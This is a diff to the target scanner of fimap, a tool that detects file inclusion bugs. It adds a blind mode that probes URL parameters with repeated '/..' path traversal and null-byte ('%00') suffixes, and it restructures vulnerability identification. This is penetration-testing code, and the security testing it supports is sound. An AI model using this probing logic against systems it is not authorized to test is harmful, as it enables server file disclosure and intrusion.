@@ -41,9 +41,7 @@ class targetScanner (baseClass.baseClass):
 
     def _load(self):
         self.INC_SUCCESS_MSG = "for inclusion (include_path="
-
-
-
+        self.MonkeyTechnique = False
         self._log("TargetScanner loaded.", self.globSet.LOG_DEBUG)
         self.params = {}
 
@@ -93,140 +91,192 @@ class targetScanner (baseClass.baseClass):
                     self._log("Possible local file disclose found! -> '%s' with Parameter '%s'. (IDENTIFY DISABLED IN THIS VERSION)"%(tmpurl, k), self.globSet.LOG_ALWAYS)
                     #self.identifyReadFile(URL, Params, VulnParam)
                     self._writeToLog("READ ; %s ; %s"%(tmpurl, k))
+
+        if (len(ret) == 0 and self.MonkeyTechnique):
+            self._log("No bug found by relying on error messages. Trying to break it blindly...", self.globSet.LOG_DEBUG)
+            files     = settings["files"]
+            for f,v,p,t in files:
+                for i in range(settings["blind"]["minlevel"], settings["blind"]["maxlevel"]):
+                    doBreak = False
+                    testfile = f
+                    if (i > 0):
+                        testfile = "/.." * i + f
+                    rep = None
+                    for k,V in self.params.items():
+                        tmpurl = self.Target_URL
+                        tmpurl = tmpurl.replace("%s=%s"%(k,V), "%s=%s"%(k, testfile))
+                        self._log("Requesting: '%s'..." %(tmpurl), self.globSet.LOG_DEBUG)
+                        code = self.doGetRequest(tmpurl)
+                        if (code.find(v) != -1):
+                            self._log("Possible file inclusion found blindly! -> '%s' with Parameter '%s'." %(tmpurl, k), self.globSet.LOG_ALWAYS)
+                            doBreak = True
+                            rep = self.identifyVuln(self.Target_URL, self.params, k, blindmode=("/.." * i, False))
+                        else:
+                            tmpurl = self.Target_URL
+                            testfile = testfile + "%00"
+                            tmpurl = tmpurl.replace("%s=%s"%(k,V), "%s=%s"%(k, testfile))
+                            self._log("Requesting: '%s'..." %(tmpurl), self.globSet.LOG_DEBUG)
+                            code = self.doGetRequest(tmpurl)
+                            if (code.find(v) != -1):
+                                self._log("Possible file inclusion found blindly! -> '%s' with Parameter '%s'." %(tmpurl, k), self.globSet.LOG_ALWAYS)
+                                doBreak = True
+                                rep = self.identifyVuln(self.Target_URL, self.params, k, blindmode=("/.." * i, True))
+                        if (rep != None):
+                            rep.setVulnKeyVal(V)
+                            ret.append((rep, self.readFiles(rep)))
+                    if (doBreak): break
         return(ret)
 
 
 
-    def identifyVuln(self, URL, Params, VulnParam, identifyMode="inc"):
+    def identifyVuln(self, URL, Params, VulnParam, identifyMode="inc", blindmode=None):
         # identify Mode can be set to 'inc' for inclusion check or to 'read' for read file check.
 
-        script = None
-        scriptpath = None
-        pre = None
+        if (blindmode == None):
 
-        self._log("Identifying Vulnerability '%s' with Parameter '%s'..."%(URL, VulnParam), self.globSet.LOG_ALWAYS)
-        tmpurl = URL
-        rndStr = self.getRandomStr()
-        tmpurl = tmpurl.replace("%s=%s"%(VulnParam,Params[VulnParam]), "%s=%s"%(VulnParam, rndStr))
+            script = None
+            scriptpath = None
+            pre = None
 
-        RE_SUCCESS_MSG = re.compile(INCLUDE_ERR_MSG%(rndStr), re.DOTALL)
+            self._log("Identifying Vulnerability '%s' with Parameter '%s'..."%(URL, VulnParam), self.globSet.LOG_ALWAYS)
+            tmpurl = URL
+            rndStr = self.getRandomStr()
+            tmpurl = tmpurl.replace("%s=%s"%(VulnParam,Params[VulnParam]), "%s=%s"%(VulnParam, rndStr))
 
-        code = self.doGetRequest(tmpurl)
-        
-        if (code == None):
-            self._log("Identification of vulnerability failed. (code == None)", self.globSet.LOG_ERROR)
-        m = RE_SUCCESS_MSG.search(code)
-        if (m == None):
-            self._log("Identification of vulnerability failed. (m == None)", self.globSet.LOG_ERROR)
-            return None
+            RE_SUCCESS_MSG = re.compile(INCLUDE_ERR_MSG%(rndStr), re.DOTALL)
 
+            code = self.doGetRequest(tmpurl)
 
-        r = report(URL, Params, VulnParam)
-
-        for sp_err_msg in SCRIPTPATH_ERR_MSG:
-            RE_SCRIPT_PATH = re.compile(sp_err_msg)
-            s = RE_SCRIPT_PATH.search(code)
-            if (s != None): break
-        if (s == None):
-            self._log("Failed to retrieve script path.", self.globSet.LOG_WARN)
-            
-            print "[MINOR BUG FOUND]"
-            print "------------------------------------------------------"
-            print "It's possible that fimap was unable to retrieve the scriptpath"
-            print "because the regex for this kind of error message is missing."
-            a = raw_input("Do you want to help me and send the URL of the site? [y = Print Info/N = Discard]")
-            if (a=="y" or a=="Y"):
-                print "-----------SEND THIS TO 'fimap.dev@gmail.com'-----------"
-                print "SUBJECT: fimap Regex" 
-                print "ERROR  : Failed to retrieve script path."
-                print "URL    : " + URL
-                print "-----------------------------------------------------------"
-                raw_input("Copy it and press enter to proceed with scanning...")
-            else:
-                print "No problem! I'll continue with your scan..."
-            
-            return(None)
-        else:
-            script = s.group(1)
-            if (script != None and script[1] == ":"): # Windows detection quick hack
-                scriptpath = script[:script.rfind("\\")]
-                r.setWindows()
-            elif (script != None and script.startswith("\\\\")):
-                scriptpath = script[:script.rfind("\\")]
-                r.setWindows()
-            else:
-                scriptpath = os.path.dirname(script)
-                
-            # Check if scriptpath was received correctly.
-            if(scriptpath!=""):
-                self._log("Scriptpath received: '%s'" %(scriptpath), self.globSet.LOG_INFO)
-                r.setServerPath(scriptpath)
-                r.setServerScript(script)
+            if (code == None):
+                self._log("Identification of vulnerability failed. (code == None)", self.globSet.LOG_ERROR)
+            m = RE_SUCCESS_MSG.search(code)
+            if (m == None):
+                self._log("Identification of vulnerability failed. (m == None)", self.globSet.LOG_ERROR)
+                return None
 
 
-        if (r.isWindows()):
-            self._log("Windows servers are currently not supported. Skipping it...", self.globSet.LOG_WARN)
-            return(None)
+            r = report(URL, Params, VulnParam)
 
+            for sp_err_msg in SCRIPTPATH_ERR_MSG:
+                RE_SCRIPT_PATH = re.compile(sp_err_msg)
+                s = RE_SCRIPT_PATH.search(code)
+                if (s != None): break
+            if (s == None):
+                self._log("Failed to retrieve script path.", self.globSet.LOG_WARN)
 
-        errmsg = code[m.start(): m.end()]
-        errmsg = errmsg[errmsg.find("'")+1:errmsg.rfind("'")]
-        
-        if (errmsg == rndStr):
-            r.setPrefix("")
-            r.setSurfix("")
-        else:
-            tokens = errmsg.split(rndStr)
-            pre = tokens[0]
-            addSlash = False
-            if (pre == ""):
-                pre = "/"
-            #else:
-            #    if pre[-1] != "/":
-            #       addSlash = True
-
-            if (pre[0] != "/"):
-                pre = posixpath.join(r.getServerPath(), pre)
-                pre = posixpath.normpath(pre)
-            pre = self.relpath("/", pre)
-            if addSlash: pre = "/" + pre
-            sur = tokens[1]
-            if (pre == "."): pre = ""
-            r.setPrefix(pre)
-            r.setSurfix(sur)
-
-            if (sur != ""):
-                self._log("Trying NULL-Byte Poisoning to get rid of the suffix...", self.globSet.LOG_INFO)
-                tmpurl = URL
-                tmpurl = tmpurl.replace("%s=%s"%(VulnParam,Params[VulnParam]), "%s=%s%%00"%(VulnParam, rndStr))
-                code = self.doGetRequest(tmpurl)
-                if (code == None):
-                    self._log("NULL-Byte testing failed.", self.globSet.LOG_WARN)
-                    r.setNullBytePossible(False)
-                elif (code.find("%s\\0%s"%(rndStr, sur)) != -1 or code.find("%s%s"%(rndStr, sur)) != -1):
-                    self._log("NULL-Byte Poisoning not possible.", self.globSet.LOG_INFO)
-                    r.setNullBytePossible(False)
+                print "[MINOR BUG FOUND]"
+                print "------------------------------------------------------"
+                print "It's possible that fimap was unable to retrieve the scriptpath"
+                print "because the regex for this kind of error message is missing."
+                a = raw_input("Do you want to help me and send the URL of the site? [y = Print Info/N = Discard]")
+                if (a=="y" or a=="Y"):
+                    print "-----------SEND THIS TO 'fimap.dev@gmail.com'-----------"
+                    print "SUBJECT: fimap Regex"
+                    print "ERROR  : Failed to retrieve script path."
+                    print "URL    : " + URL
+                    print "-----------------------------------------------------------"
+                    raw_input("Copy it and press enter to proceed with scanning...")
                 else:
-                    self._log("NULL-Byte Poisoning successfull!", self.globSet.LOG_INFO)
-                    r.setSurfix("%00");
-                    r.setNullBytePossible(True)
+                    print "No problem! I'll continue with your scan..."
 
-
-        if (scriptpath == ""):
-            # Failed to get scriptpath with easy method :(
-            if (pre != ""):
-                self._log("Failed to retrieve path but we are forced to go relative!", self.globSet.LOG_WARN)
                 return(None)
             else:
-                self._log("Failed to retrieve path! It's an absolute injection so I'll fake it to '/'...", self.globSet.LOG_WARN)
-                scriptpath = "/"  
-                r.setServerPath(scriptpath)
-                r.setServerScript(script)
+                script = s.group(1)
+                if (script != None and script[1] == ":"): # Windows detection quick hack
+                    scriptpath = script[:script.rfind("\\")]
+                    r.setWindows()
+                elif (script != None and script.startswith("\\\\")):
+                    scriptpath = script[:script.rfind("\\")]
+                    r.setWindows()
+                else:
+                    scriptpath = os.path.dirname(script)
 
-        return(r)
+                # Check if scriptpath was received correctly.
+                if(scriptpath!=""):
+                    self._log("Scriptpath received: '%s'" %(scriptpath), self.globSet.LOG_INFO)
+                    r.setServerPath(scriptpath)
+                    r.setServerScript(script)
 
 
+            if (r.isWindows()):
+                self._log("Windows servers are currently not supported. Skipping it...", self.globSet.LOG_WARN)
+                return(None)
 
+
+            errmsg = code[m.start(): m.end()]
+            errmsg = errmsg[errmsg.find("'")+1:errmsg.rfind("'")]
+
+            if (errmsg == rndStr):
+                r.setPrefix("")
+                r.setSurfix("")
+            else:
+                tokens = errmsg.split(rndStr)
+                pre = tokens[0]
+                addSlash = False
+                if (pre == ""):
+                    pre = "/"
+                #else:
+                #    if pre[-1] != "/":
+                #       addSlash = True
+
+                if (pre[0] != "/"):
+                    pre = posixpath.join(r.getServerPath(), pre)
+                    pre = posixpath.normpath(pre)
+                pre = self.relpath("/", pre)
+                if addSlash: pre = "/" + pre
+                sur = tokens[1]
+                if (pre == "."): pre = ""
+                r.setPrefix(pre)
+                r.setSurfix(sur)
+
+                if (sur != ""):
+                    self._log("Trying NULL-Byte Poisoning to get rid of the suffix...", self.globSet.LOG_INFO)
+                    tmpurl = URL
+                    tmpurl = tmpurl.replace("%s=%s"%(VulnParam,Params[VulnParam]), "%s=%s%%00"%(VulnParam, rndStr))
+                    code = self.doGetRequest(tmpurl)
+                    if (code == None):
+                        self._log("NULL-Byte testing failed.", self.globSet.LOG_WARN)
+                        r.setNullBytePossible(False)
+                    elif (code.find("%s\\0%s"%(rndStr, sur)) != -1 or code.find("%s%s"%(rndStr, sur)) != -1):
+                        self._log("NULL-Byte Poisoning not possible.", self.globSet.LOG_INFO)
+                        r.setNullBytePossible(False)
+                    else:
+                        self._log("NULL-Byte Poisoning successfull!", self.globSet.LOG_INFO)
+                        r.setSurfix("%00")
+                        r.setNullBytePossible(True)
+
+
+            if (scriptpath == ""):
+                # Failed to get scriptpath with easy method :(
+                if (pre != ""):
+                    self._log("Failed to retrieve path but we are forced to go relative!", self.globSet.LOG_WARN)
+                    return(None)
+                else:
+                    self._log("Failed to retrieve path! It's an absolute injection so I'll fake it to '/'...", self.globSet.LOG_WARN)
+                    scriptpath = "/"
+                    r.setServerPath(scriptpath)
+                    r.setServerScript(script)
+
+            return(r)
+        
+        
+        else:
+            # Blindmode
+            prefix = blindmode[0]
+            isNull = blindmode[1]
+            self._log("Identifying Vulnerability '%s' with Parameter '%s' blindly..."%(URL, VulnParam), self.globSet.LOG_ALWAYS)
+            r = report(URL, Params, VulnParam)
+            r.setBlindDiscovered(True)
+            r.setSurfix("")
+            if isNull: r.setSurfix("%00")
+            r.setNullBytePossible(isNull)
+            if (prefix.strip() == ""):
+                r.setServerPath("/noop")
+            else:
+                r.setServerPath(prefix.replace("..", "a"))
+            r.setServerScript("noop")
+            r.setPrefix(prefix)
+            return(r)
 
 
     def readFiles(self, rep):
